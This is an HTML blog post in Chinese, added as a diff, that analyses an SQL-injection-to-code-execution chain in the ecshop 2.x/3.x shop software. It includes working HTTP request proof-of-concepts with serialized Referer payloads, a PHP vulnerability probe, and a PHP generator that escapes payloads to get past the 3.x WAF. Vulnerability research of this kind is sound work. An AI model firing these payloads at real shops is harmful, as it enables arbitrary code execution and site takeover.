@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>从SQLi到RCE -- ecshop 2.x/3.x无限制getshell | XUPTSEC&#39;s blog</title>
+  
+    <link rel="icon" href="/assets/favicon.png">
+  
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class='SideBar'>
+    <section class='avatar' style="background-image: url(/assets/header.png)">
+        <div class='av-pic' style="background-image: url(/assets/favicon.png)">
+        </div>
+    </section>
+    <section class='menu'>
+        <div>XUPTSEC&#39;s blog</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+            
+                <a href="https://github.com/xuptsec-admin">
+                    <img src="/assets/github.svg" />
+                </a>
+            
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class='ContentView'>
+    <header class='PageTitle'>
+        <h1>从SQLi到RCE -- ecshop 2.x/3.x无限制getshell</h1>
+    </header>
+
+    <section>
+      <h1 id="从SQLi到RCE-–-ecshop-2-x-3-x无限制getshell"><a href="#从SQLi到RCE-–-ecshop-2-x-3-x无限制getshell" class="headerlink" title="从SQLi到RCE – ecshop 2.x/3.x无限制getshell"></a>从SQLi到RCE – ecshop 2.x/3.x无限制getshell</h1><h2 id="如何从SQLi到RCE-–-ecshope-2-3-x-Getshell"><a href="#如何从SQLi到RCE-–-ecshope-2-3-x-Getshell" class="headerlink" title="如何从SQLi到RCE – ecshope 2/3.x Getshell"></a>如何从SQLi到RCE – ecshope 2/3.x Getshell</h2><p>分为两个个部分：</p>
+<ol>
+<li>ecshop 2.x getshell</li>
+<li>Bypass ecshop 3.x WAF<a id="more"></a></li>
+</ol>
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="ecshop-2-x"><a href="#ecshop-2-x" class="headerlink" title="ecshop 2.x"></a>ecshop 2.x</h3><h4 id="SQLi-POC"><a href="#SQLi-POC" class="headerlink" title="SQLi POC"></a>SQLi POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: test1.ecshop.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:61.0) Gecko/20100101 Firefox/61.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:68:"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)";s:2:"id";i:1;&#125;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+<p><img src="http://whip1ash.cn/media/15362230081597.jpg" alt="img"></p>
+<h4 id="RCE-POC"><a href="#RCE-POC" class="headerlink" title="RCE POC"></a>RCE POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: test1.ecshop.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:84:"*/union select 1,0x272f2a,4,4,5,6,7,8,0x7b24275d3b706870696e666f2f2a2a2f28292f2f7d,0";s:2:"id";s:3:"'/*";&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure>
+<p><img src="http://whip1ash.cn/media/15363146794705.jpg" alt="img"></p>
+<h4 id="ecshop-3-x-bypass-waf-POC"><a href="#ecshop-3-x-bypass-waf-POC" class="headerlink" title="ecshop 3.x bypass waf POC"></a>ecshop 3.x bypass waf POC</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/user.php?act=login</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: test.ecshop.com</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:"num";S:96:"*/\75\6e\69\6f\6e\20\73\65\6c\65\63\74\20\31\2c\30\78\32\37\32\66\32\61\2c\34\2c\34\2c\35\2c\36\2c\37\2c\38\2c\30\78\37\62\32\34\36\31\32\37\35\64\33\62\37\30\36\38\37\30\36\39\36\65\36\36\36\66\32\66\32\61\32\61\32\66\32\38\32\39\33\62\33\62\32\34\36\31\35\62\32\37\33\31\37\64\2c\30";s:2:"id";s:3:"'/*";&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">Content-Length</span>: 0</span><br></pre></td></tr></table></figure>
+<p><img src="http://whip1ash.cn/media/15371878693825.jpg" alt="img"></p>
+<h2 id="Analyze"><a href="#Analyze" class="headerlink" title="Analyze"></a>Analyze</h2><h3 id="ecshop-2-x-1"><a href="#ecshop-2-x-1" class="headerlink" title="ecshop 2.x"></a>ecshop 2.x</h3><h4 id="SQLi"><a href="#SQLi" class="headerlink" title="SQLi"></a>SQLi</h4><p>在前台用户登录页面，<code>$back_act</code>变量从referer中获取，传递到<code>$smarty-&gt;assign()</code>函数中。<br>user.php<br><img src="http://whip1ash.cn/media/15362245237414.jpg" alt="img"></p>
+<p>跟进<code>$smarty-&gt;assign()</code>。<br>includes/cls_template.php<br><img src="http://whip1ash.cn/media/15362242468298.jpg" alt="img"><br>当<code>$tpl_var</code>不是数组且不为空时，添加到当前对象的<code>_var</code>数组中。<br>将上述变量显示到页面上需要<code>$smarty-&gt;display()</code>函数。跟进一下。<br>includes/cls_template.php<br><img src="http://whip1ash.cn/media/15362274077547.jpg" alt="img"><br>通过这里通过<code>$this-&gt;fetch()</code>-&gt;<code>$this-&gt;make_complied()</code>来获取最终呈现在页面上的结果，也就是<code>$out</code>变量的值，关于Smarty的知识简单的介绍一下。</p>
+<p>这里使用了Smarty这个PHP模板框架，原理如图所示。<br><img src="http://whip1ash.cn/media/15362269107018.jpg" alt="img"><br>登录页面的模板文件在<code>themes/default/user_passport.dwt</code>，编译后的php文件路径为<code>temp/compiled/user_passport.dwt.php</code>，其中使用了<code>$back_act</code>值的部分如图所示。<br><img src="http://whip1ash.cn/media/15362270721878.jpg" alt="img"></p>
+<p><img src="http://whip1ash.cn/media/15362270538028.jpg" alt="img"><br>所以我们通过referer控制的值，经过编译以及PHP的运行，最后的呈现出来的结果如下图所示。<br><img src="http://whip1ash.cn/media/15362272995700.jpg" alt="img"></p>
+<p>回到<code>fetch()</code>函数，得到<code>$out</code>的值后判断其中是否存在<code>$this-&gt;_echash</code>，这是一个常量，在这里是<code>554fcae493e564ee0dc75bdf2ebf94ca</code>，然后进行分割，并进入<code>$this-&gt;insert_mod()</code>函数。<br><img src="http://whip1ash.cn/media/15362281757567.jpg" alt="img"></p>
+<p>重点来了，一眼看上去这个东西就有问题，一是存在反序列化，二是使用动态调用函数。全局搜索一下<code>function insert_</code>主要定位在lib_insert里。在这里就先用<code>insert_ads</code>这个函数。<br>includes/lib_insert.php<br><img src="http://whip1ash.cn/media/15362421492775.jpg" alt="img"></p>
+<p>这里可以比较明显的看出SQL语句存在拼接。这里只用了id和num两个参数，所以我们只需要序列化构造这两个参数就可以。这里用id这个参数，这里可以使用extractvalue就行，如果用produce analyse的话5.6.6以上的版本不支持。这里不再赘述了，POC如所示。<br><img src="http://whip1ash.cn/media/15362428099522.jpg" alt="img"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">poc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		$echash = <span class="string">'554fcae493e564ee0dc75bdf2ebf94ca'</span>;</span><br><span class="line">		$dyn_func = <span class="string">'ads'</span>;</span><br><span class="line">		$poc = <span class="keyword">array</span>(<span class="string">'num'</span>=&gt;<span class="string">'2'</span>,<span class="string">'id'</span>=&gt;<span class="string">'1\' and (extractvalue(1,concat(0x7e,(select user()),0x7e)))#'</span>);</span><br><span class="line">		$serialize = serialize($poc);</span><br><span class="line">		$referer = $echash.$dyn_func.<span class="string">"|"</span>.$serialize;</span><br><span class="line">		<span class="keyword">return</span> $referer;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($domain,$referer)</span></span>&#123;</span><br><span class="line">		$header = <span class="keyword">array</span>(<span class="string">"Referer: $referer"</span>);</span><br><span class="line">		</span><br><span class="line">		$ch = curl_init();</span><br><span class="line">		curl_setopt($ch,CURLOPT_URL,$domain.<span class="string">"/user.php?act=login"</span>);</span><br><span class="line">		curl_setopt($ch,CURLOPT_RETURNTRANSFER,<span class="number">1</span>);</span><br><span class="line">		curl_setopt($ch,CURLOPT_HTTPHEADER,$header);</span><br><span class="line">		</span><br><span class="line">		curl_setopt($ch, CURLOPT_PROXY, <span class="string">"http://127.0.0.1"</span>);</span><br><span class="line">		curl_setopt($ch, CURLOPT_PROXYPORT, <span class="number">8080</span>);</span><br><span class="line">		</span><br><span class="line">		$output = curl_exec($ch);</span><br><span class="line">		curl_close($ch);</span><br><span class="line">		<span class="keyword">if</span>($output === <span class="keyword">FALSE</span> )&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"CURL Error:"</span>.curl_error($ch);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(strpos($output, <span class="string">"XPATH syntax error"</span>) !== <span class="keyword">false</span>)&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"This domain can be pwn!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"This server is safe!"</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$domain = <span class="string">"http://test1.ecshop.com"</span>;</span><br><span class="line">	$referer = poc();</span><br><span class="line">	</span><br><span class="line">	curl($domain,$referer);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h4><p>继续看<code>insert_ads</code>这个函数的后半段。<br><img src="http://whip1ash.cn/media/15362429122007.jpg" alt="img"><br><code>$position_style</code>是可控的，是从数据库中取出来的<br>209行的这个<code>$position_style</code>变量加上了<code>str:</code>并传入了<code>fetch()</code>函数，看一眼<code>fetch()</code>函数。<br><img src="http://whip1ash.cn/media/15362431327406.jpg" alt="img"><br>可以发现，对于开头是<code>str:</code>的文件名带进了<code>_eval()</code>这个看起来就很敏感的函数。所以回<code>insert_ads</code>函数看看如何控制<code>$position_style</code>的值。<br>includes/lib_insert.php<br><img src="http://whip1ash.cn/media/15362432910293.jpg" alt="img"><br>从数据库查询出来的表中，<code>position_id</code>字段的值要与反序列化出来的数组<code>$arr</code>的<code>id</code>字段相等，才会进行赋值。那么上面通过控制<code>$arr[&#39;id&#39;]</code>来进行注入的方式就不是那么好用了，主要还得通过<code>$arr[&#39;num&#39;]</code>来传递payload。<br><code>media_type</code>字段这里给4，为了不执行switch逻辑，以免节外生枝。<br>所以构造如下payload:</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:86:"*/union select 1,0x272f2a,4,4,5,6,7,8,0x74657374706f63706f63706f63706f63706f63706f63,0";s:2:"id";s:3:"'/*";&#125;</span><br></pre></td></tr></table></figure>
+<p>把order by limit给注释掉就可以无限制进行注入了。<br>回到includes/cls_template.php的<code>fetch()</code>函数。跟进一下<code>_eval()</code>的前一步处理<code>fetch_str()</code>。<br><img src="http://whip1ash.cn/media/15362474632329.jpg" alt="img"></p>
+<p>还是一个比较复杂的正则，但是问题不大，可以使用<code>https://regex101.com/</code>来看看这个函数匹配了哪些东西。<br>先看第一个正则，这个正则主要是过滤一些关键字，分为三个部分，第一个部分匹配除了<code>a-z0-9A-Z_</code>以外的所有字符，第二部分值一些敏感函数的关键字，最后匹配空格和前半括号一次。<br><img src="http://whip1ash.cn/media/15362816925285.jpg" alt="img"><br>第二个正则不用管，只要不进入if这段逻辑就可以了，最后return的正则也比较简单，就是将匹配到(花括号中的内容)的值传递给<code>$this-&gt;select()</code>，这里phpStorm跟不进去，可以将cls_template.php复制出来，然后在外面调用。<br>我们先给一个简单的poc:<code>{phpinfo()}</code>，因为phpinfo在第一个正则会被过滤，所以注释一下，绕过第一个正则。<code>{phpinfo/**/()}</code></p>
+<p>includes/cls_template.php<br><img src="http://whip1ash.cn/media/15362859279328.jpg" alt="img"><br>可以看到在<code>tag</code>变量第一个字符为$的时候进入 <code>get_val()</code> ，跟一下<code>get_val()</code>。<br>这里有一个巨坑的地方，不知道是不是我字体的原因，我这里的phpstorm居然在单双引号中不显示<code>.</code>这个字符。坑爆了，刚开始以为是匹配<code>$</code>，后来发现是匹配<code>.$</code>，升级到最新版本可以解决这个问题。<br>我们给poc加上$，带进去试试。<br><img src="http://whip1ash.cn/media/15362889193527.jpg" alt="img"><br>跳入<code>get_value</code>中的图中标出的逻辑。跟进<code>make_var</code>函数。<br><img src="http://whip1ash.cn/media/15362891027956.jpg" alt="img"><br>可以看到在这个函数中给poc拼接了一些字符串。<br><img src="http://whip1ash.cn/media/15362893318990.jpg" alt="img"></p>
+<p>所以最终的处理是这样的。<br><img src="http://whip1ash.cn/media/15362895041088.jpg" alt="img"><br>闭合一下。<br><img src="http://whip1ash.cn/media/15362900203459.jpg" alt="img"><br>所以最后带进eval的值如图所示。<br><img src="http://whip1ash.cn/media/15362902849758.jpg" alt="img"><br>构造最终的poc应该为<code>{$&#39;];phpinfo/**/()//}</code>。序列化一下。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:84:"*/union select 1,0x272f2a,4,4,5,6,7,8,0x7b24275d3b706870696e666f2f2a2a2f28292f2f7d,0";s:2:"id";s:3:"'/*";&#125;</span><br></pre></td></tr></table></figure>
+<p>这个POC执行一下发现，报错了。<br><img src="http://whip1ash.cn/media/15363133863672.jpg" alt="img"><br>调了一下发现是在反序列化的时候有一个参数的空的。<br>看了一下中间生成的模板，发现其他在分割的时候都如下图所示。<br><img src="http://whip1ash.cn/media/15363144117859.jpg" alt="img"><br>这个主要是<code>display()</code>函数中的这一段。<br><img src="http://whip1ash.cn/media/15363145449169.jpg" alt="img"><br>所以最后的POC如下所示。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:"num";s:84:"*/union select 1,0x272f2a,4,4,5,6,7,8,0x7b24275d3b706870696e666f2f2a2a2f28292f2f7d,0";s:2:"id";s:3:"'/*";&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br></pre></td></tr></table></figure>
+<p><img src="http://whip1ash.cn/media/15363146384976.jpg" alt="img"></p>
+<h3 id="echsop-3-x-bypass-WAF"><a href="#echsop-3-x-bypass-WAF" class="headerlink" title="echsop 3.x bypass WAF"></a>echsop 3.x bypass WAF</h3><p>用上一次构造的POC打一下，发现被拦了。<br><img src="http://whip1ash.cn/media/15371890931440.jpg" alt="img"><br>搜一下这个字符串。<br>includes/safety.php<br><img src="http://whip1ash.cn/media/15371893629675.jpg" alt="img"></p>
+<p>发现3.x带有一个WAF，简单的看了一下，主要是通过正则匹配关键字进行过滤的。<br><img src="http://whip1ash.cn/media/15371894283526.jpg" alt="img"></p>
+<p>所以POC中不能出现被拦截的关键字，比如 select，union等。<br>对比了一下2.x和3.x存在漏洞的地方，发现其他位置并没有进行改动。<br>这里有一个trick可以bypass这个waf - 使用反序列化的escaped binary string类型。<br><img src="http://whip1ash.cn/media/15371897755193.jpg" alt="img"><br>php的反序列化对于转义字符存在一个特性，在序列化和反序列化的时候可以对转义字符进行处理。<br>众所周知，PHP可以对双引号内的数据进行转义。如图，<br><img src="http://whip1ash.cn/media/15371901537155.jpg" alt="img"><br>所以当然在序列化的时候也可以用。<br><img src="http://whip1ash.cn/media/15371899876940.jpg" alt="img"><br>在反序列化的时候设置数据类型为S时，也可是使用这个特性。（目前没有找到办法可以序列化成S类型，只能通过手动设置）<br><img src="http://whip1ash.cn/media/15371913733092.jpg" alt="img"><br>这里注意一下，S类型的数据长度是转义后的长度，而不是输入数据的长度。</p>
+<p>所以刚才的POC注入的SQL语句转成S类型就好了。</p>
+<p>下面是POC。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">strToHex</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">	$hex=<span class="string">""</span>;</span><br><span class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($string);$i++)</span><br><span class="line">	$hex.=dechex(ord($string[$i]));</span><br><span class="line">	$hex=strtolower($hex);</span><br><span class="line">	<span class="keyword">return</span> $hex;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//构造poc</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">base_poc</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">	$base_poc = <span class="string">"&#123;\$a'];$payload//&#125;"</span>;</span><br><span class="line">	$base_poc = strToHex($base_poc);</span><br><span class="line">	<span class="keyword">return</span> $base_poc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//生成referer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">referer</span><span class="params">($base_poc)</span></span>&#123;</span><br><span class="line">	$echash = <span class="string">'45ea207d7a2b68c49582d2d22adf953a'</span>;</span><br><span class="line">	$dyn_func = <span class="string">'ads'</span>;</span><br><span class="line">	$poc0 = <span class="keyword">array</span>(<span class="string">'num'</span>=&gt;<span class="string">"*/union select 1,0x272f2a,4,4,5,6,7,8,0x$base_poc,0"</span>,<span class="string">'id'</span>=&gt;<span class="string">'\'/*'</span>);</span><br><span class="line">	$serialize = serialize($poc0);</span><br><span class="line">	$referer = $echash.$dyn_func.<span class="string">"|"</span>.$serialize.$echash;</span><br><span class="line">	<span class="keyword">return</span> $referer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">construt_str</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$res = <span class="keyword">array</span>(<span class="string">"origin"</span>=&gt;<span class="string">''</span>,<span class="string">"modified"</span>=&gt;<span class="string">''</span>);</span><br><span class="line">	<span class="comment">//截取字段num中的值</span></span><br><span class="line">	$poc_pos0 = strpos($str, <span class="string">"union"</span>);</span><br><span class="line">	$poc_pos1 = strrpos($str, <span class="string">","</span>)+<span class="number">2</span>;</span><br><span class="line">	$poc_len = $poc_pos1 - $poc_pos0;</span><br><span class="line">	$tmp_poc = substr($str, $poc_pos0,$poc_len);</span><br><span class="line">	<span class="comment">//后面替换时使用</span></span><br><span class="line">	$res[<span class="string">'origin'</span>] = $tmp_poc;</span><br><span class="line">	$res[<span class="string">'modified'</span>] = modify_str($tmp_poc);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//处理字符串格式</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">modify_str</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">	$str = strToHex($str);</span><br><span class="line">	</span><br><span class="line">	$insert = <span class="string">'\\'</span>;</span><br><span class="line">	$str_len = strlen($str);</span><br><span class="line">	<span class="keyword">if</span>($str_len % <span class="number">2</span> !== <span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"The length of input string is wrong!"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>($i = <span class="number">0</span>; $i&lt;($str_len*<span class="number">3</span>/<span class="number">2</span>); $i=$i+<span class="number">3</span>)&#123;</span><br><span class="line">		$str = substr_replace($str, $insert, $i ,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace</span><span class="params">($origin,$modified,$referer)</span></span>&#123;</span><br><span class="line">	$res_poc = str_replace($origin, $modified, $referer);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//使用 escaped binary string 模式</span></span><br><span class="line">	$pos = strpos($res_poc, <span class="string">'m";'</span>) + <span class="number">3</span>;</span><br><span class="line">	$res_poc[$pos] = <span class="string">'S'</span>;</span><br><span class="line">	<span class="keyword">return</span> $res_poc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">poc</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">	$base_poc = base_poc($payload);</span><br><span class="line">	$referer = referer($base_poc);</span><br><span class="line">	$tmp_res = construt_str($referer);</span><br><span class="line">	$res = replace($tmp_res[<span class="string">'origin'</span>], $tmp_res[<span class="string">'modified'</span>], $referer);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $res;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">	$payload = <span class="string">"phpinfo/**/();"</span>;</span><br><span class="line">	<span class="keyword">echo</span> poc($payload).<span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line">		</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="说点废话"><a href="#说点废话" class="headerlink" title="说点废话"></a>说点废话</h2><p>这个漏洞的信息量比较大，还是比较值得学习的。中间电脑拿去修了，所以上下篇隔得时间稍微有点久，望谅解。</p>
+
+
+      
+
+    </section>
+    
+      <section class='ArticleMeta'>
+          <div>
+            发布于&nbsp;
+            <time datetime="2018-09-18T11:51:45.000Z" itemprop="datePublished">
+              2018-09-18
+            </time>
+          </div>
+          
+            <div>
+              tags: 
+  <li class="meta-text">
+  { <a href="/tags/代码审计/">代码审计</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/php/">php</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/漏洞分析/">漏洞分析</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/0day/">0day</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/getshell/">getshell</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/sql/">sql</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/RCE/">RCE</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/CMS/">CMS</a> }
+  </li>
+
+
+            </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2018 - XUPTSEC </div>
+    <div>
+        <span>
+            Powered by <a href="https://hexo.io">Hexo</a>
+        </span>
+        ,
+        <span>
+            Theme - <a href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
+        </span>
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
